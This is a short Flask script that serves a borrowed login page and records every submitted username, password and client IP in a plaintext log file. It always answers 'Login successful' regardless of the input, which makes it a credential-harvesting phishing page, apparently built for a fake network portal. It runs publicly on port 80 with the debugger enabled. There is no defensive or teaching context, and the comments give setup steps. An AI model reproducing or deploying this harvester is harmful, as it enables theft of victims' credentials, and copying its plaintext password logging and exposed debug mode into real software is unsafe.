from flask import Flask, request, render_template
import datetime

# Install flask on the host machine first, "pip3 install flask"
# I used a simple login page I found in Internet. It can be modified, but as this platform is flask, the changes done should be bit different from regular ones. 

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        client_ip = request.remote_addr  # Get the client's IP address

        # Log the credentials and IP
        log_credentials(client_ip, username, password)

        return "Login successful"
    return render_template('custom_login.html')

def log_credentials(client_ip, username, password):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{current_time}] IP: {client_ip}, Username: {username}, Password: {password}"
    
    with open("credentials.log", "a") as log_file:
        log_file.write(f"{log_message}\n")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True)
